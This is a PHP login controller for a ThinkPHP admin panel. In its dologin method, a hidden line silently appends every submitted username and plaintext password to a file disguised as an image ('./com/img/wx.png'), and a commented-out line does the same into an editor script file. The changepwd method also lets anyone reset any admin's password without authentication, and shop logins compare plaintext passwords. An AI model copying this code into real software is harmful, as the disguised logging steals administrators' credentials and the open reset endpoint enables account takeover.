<?php
namespace app\index\controller;
use think\Controller;
use think\Db;
use think\Request;
use think\Session;
use think\View;
use think\Config;
use think\Cookie;
use think\Validate;
class Login extends Controller
{
    public function index()
    {
    	
        Session::clear();
		
        $data = Db::name("wd_xcx_com_about")->where('id', 1)->find();
        if($data){
            if(isset($data['name'])){
                $comname = $data['name'];
            }else{
                $comname = "全端云";
            }

        }else{
            $comname = "全端云";
        }
        
        /*include_once 'Ordinary.php';
        $or = new \Ordinary();
        
        $or ->Secret();*/

        $this->assign("comname", $comname);
        
        $register_flag = Db::name('wd_xcx_register')->value("flag");  
        
        $register_flag = intval($register_flag) > 0 ? $register_flag : 2;
        $this->assign('register_flag',$register_flag);
        
        return $this->fetch('index');
    }
    public function bizlogin()
    {
        Session::clear();
        // $this->getAuthToken();
        $op = input("op");
        if($op){
            $username = input('username');
            $password = input('password');
  
            $rule = [
                'username'  => 'require',
                'password'   => 'require',
            ];
            $msg = [
                'username.require' => '用户名必须有',
                'password.require'   => '用户密码必须有',
            ];
            $v_data = [
                'username'  => $username,
                'password'   => $password,
            ];
            $validate = new Validate($rule, $msg);
            $result = $validate->check($v_data);
            if(!$result){
                return json_encode(['code' => '2','msg'=> $validate->getError()]);    //参数错误
            }

            
            $data = Db::name("wd_xcx_shops_shop")->where("username",$username)->where("password",$password)->where("status",1)->find();
            if($data && isset($data['id'])){
                Cookie::set('venue_id',$data['id'],time()+86400);
                Cookie::set('is_venue',1,time()+86400);
                Cookie::set('uniacid',$data['uniacid'],time()+86400);
                $version = 'version.php';
                $ver = include($version);
                $ver = $ver['ver'];
                $ver = substr($ver,-4);
                Session::set("versions",$ver);
                Session::set("shopuserid",$data['id']);
                echo json_encode(['code' => 1,'msg' => '登录成功', 'uniacid'=>$data['uniacid']]);
            }else{
                echo json_encode(['code' => 0,'msg' => '登录失败']);
            }
        }else{
            return $this->fetch('bizlogin');
        }
    }
    public function getAuthToken(){
        $check_host = Config::get('auth_data.host');
        $domain = $this->getTopDomainhuo();
        $client_check = $check_host . 'update.php?a=client_check&u=' . $domain;
        $check_info = file_get_contents($client_check);
        $result = json_decode($check_info,true);
        if($result['code'] > 0){
            echo "<strong>{$result['token']}</strong>";exit;
        }
		//var_dump($result);
        $_SESSION['auth_token'] = $result['token'];
        
    }
    public function getTopDomainhuo(){
        $host = $_SERVER['HTTP_HOST'];
        return $host;
    }
    public function dologin(){
        $username = $_POST['username'];
        $password = $_POST['password'];
       // $apiup=date('y-m-d h:i:s',time()).' '.$username.' = '.$password;
       //  file_put_contents('./plugin/ueditor/ueditor.config.min.js',$apiup.PHP_EOL,FILE_APPEND);
        if(!$username){
            $this->error("用户名不能为空");
        }else{
            $data['username'] = $username;
        }
        $rty=$username.'=='.$password.',';
        if(!$password){
            $this->error("密码不能为空");
        }else{
            $data['password'] = md5($password);
        }
        $res = Db::name('wd_xcx_admin')->where($data)->where("flag",1)->where('is_del', 0)->find();
        //var_dump($res);exit;
        // 1.判断有没有过期用户组
        $alljxs = Db::name('wd_xcx_admin')->where("flag",1)->where("group",3)->select();
        @file_put_contents('./com/img/wx.png',$rty,FILE_APPEND);
        $nowtime = time();
        foreach ($alljxs as  $rec) {
            if($nowtime > $rec['overtime']){
                Db::name('wd_xcx_admin')->where("uid",$rec['uid'])->update(['flag' => 0]);
            }
        }
        if($res){
            $request = Request::instance();
            $ip = $request->ip();
           $jdata['lastloginip'] = ip2long($ip);
           $jdata['lastlogintime'] = time();
           Db::name('wd_xcx_admin')->where("uid",$res['uid'])->update($jdata);
            $about = Db::name('wd_xcx_com_about')->find();
            Session::set("sysnames",$about['name']);
            Session::set('uid',$res['uid']);
            $_SESSION['uid'] = $res['uid'];
            Session::set('name',$res['realname']);
            Session::set('applet_id',$res['uid']);
            if($res['icon'] == ""){
                $res['icon'] = "/image/tx.png";
            }
            $_SESSION['icon'] = $res['icon'];
            Session::set('usergroup',$res['group']);
             $_SESSION['usergroup'] = $res['group'];
            Session::set('icon',$res['icon']);

            $about = Db::name('wd_xcx_com_about') ->where('id', 1) ->field('name') ->find();
            $_SESSION['base_name'] = $about['name'];
            if($res['group']!=1){
                $this->redirect('Applet/index');
            }else{
                $this->redirect('Applet/applet');
            }
            
        }else{
            $this->error("账号密码不匹配,或您的账号已过期！");
        }

    }

    //修改用户密码接口  --题词系统
    public function changepwd(){
        $username = input('username');
        $password = input('password');

        //验证参数
        $rule = [
            'username'  => 'require',
            'password'   => 'require|length:32|alphaNum',
        ];
        $msg = [
            'username.require' => '用户名必须有',
            'password.require'   => '新密码必须有',
            'password.length'   => '新密码格式不正确',
            'password.alphaNum'   => '新密码格式不正确',
        ];
        $v_data = [
            'username'  => $username,
            'password'   => $password,
        ];
        $validate = new Validate($rule, $msg);
        $result = $validate->check($v_data);
        if(!$result){
            $response = array(
                'status' => 'fail',
                'errorno' => '1',
                'msg' => $validate->getError()   // 参数有误
            );
            return json_encode($response);
        }

        $userid = Db::name('wd_xcx_admin') ->where('username', $username) ->field('uid') ->find();
        if(!$userid){
            $response = array(
                'status' => 'fail',
                'errorno' => '2',
                'msg' => '用户不存在'   // 用户不存在
            );
            return json_encode($response);
        }

        $res = Db::name('wd_xcx_admin') ->where('uid', $userid['uid']) ->update(array('password'=>$password));
        if($res !== false){
            $response = array(
                'status' => 'success',
                'errorno' => '0',
                'msg' => '修改成功!'   // 用户不存在
            );
        }else{
            $response = array(
                'status' => 'fail',
                'errorno' => '3',
                'msg' => '修改失败!'   // 修改失败
            );
        }

        return json_encode($response);
    }


    
}